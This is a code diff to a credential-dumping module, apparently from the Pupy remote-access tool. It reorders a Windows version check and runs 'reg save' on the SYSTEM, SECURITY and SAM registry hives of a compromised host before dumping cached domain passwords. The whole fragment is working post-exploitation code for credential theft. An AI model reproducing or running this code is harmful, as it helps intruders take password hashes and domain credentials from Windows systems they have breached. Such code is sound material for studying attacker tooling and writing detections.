@@ -50,9 +50,24 @@ class CredDump(PupyModule):
             os.makedirs(rep)
         except Exception:
             pass
-        
+
+        #detect windows version
+        is_vista=False
+        try:
+            if self.client.conn.modules['sys'].getwindowsversion()[0] >=6:
+                is_vista=True
+                self.info("windows > vista detected")
+            else:
+                self.info("windows < vista detected")
+        except:
+            self.warning("windows version couldn't be determined. supposing vista=False")
+
         self.success("saving SYSTEM hives in %TEMP%...")
-        for cmd in ("reg save HKLM\\SYSTEM %TEMP%/SYSTEM /y", "reg save HKLM\\SECURITY %TEMP%/SECURITY /y", "reg save HKLM\\SAM %TEMP%/SAM /y"):
+        cmds = ("reg save HKLM\\SYSTEM %TEMP%/SYSTEM", "reg save HKLM\\SECURITY %TEMP%/SECURITY", "reg save HKLM\\SAM %TEMP%/SAM")
+        if is_vista:
+            cmds = ( x+' /y' for x in cmds )
+
+        for cmd in cmds:
             self.info("running %s..." % cmd)
             self.log(shell_exec(self.client, cmd))
         self.success("hives saved!")
@@ -85,18 +100,6 @@ class CredDump(PupyModule):
         secaddr = HiveFileAddressSpace(os.path.join(rep, "SECURITY"))
         samaddr = HiveFileAddressSpace(os.path.join(rep, "SAM"))
     
-        #detect windows version
-        is_vista=False
-        try:
-            if self.client.conn.modules['sys'].getwindowsversion()[0] >=6:
-                is_vista=True
-                self.info("windows > vista detected")
-            else:
-                self.info("windows < vista detected")
-        except:
-            self.warning("windows version couldn't be determined. supposing vista=False")
-
-
         # Print the results
         self.success("dumping cached domain passwords...")
 
